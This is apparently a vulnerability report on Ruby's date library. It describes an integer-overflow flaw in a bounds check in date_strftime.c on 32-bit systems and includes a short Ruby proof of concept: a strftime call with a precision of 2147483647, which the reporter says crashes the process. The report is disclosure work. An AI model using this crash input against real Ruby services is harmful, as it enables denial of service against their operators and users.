Summary:

(originally send by e-mail on 4 Jun 2016)

Setting a very high precision in the date_strftime_with_tmx() function,
the following check (in the STRFTIME macro in date_strftime.c) will not
work as expected if 's' >= 0x80000000 (this is the same type of issue as
the other vulnerability I submitted).

```c
124         if (start + maxsize < s + precision) {          \
125             errno = ERANGE;                 \
126             return 0;                       \
127         }
```

This code causes a crash on my 32 bit system:

```ruby
require 'date'
d =  DateTime.new(2007,11,19,8,37,48,"-06:00")
d.strftime("%2147483647c")
```

64 bit is probably not affected (strictly technically possible, but
unlikely).

Let me know if you need more information.
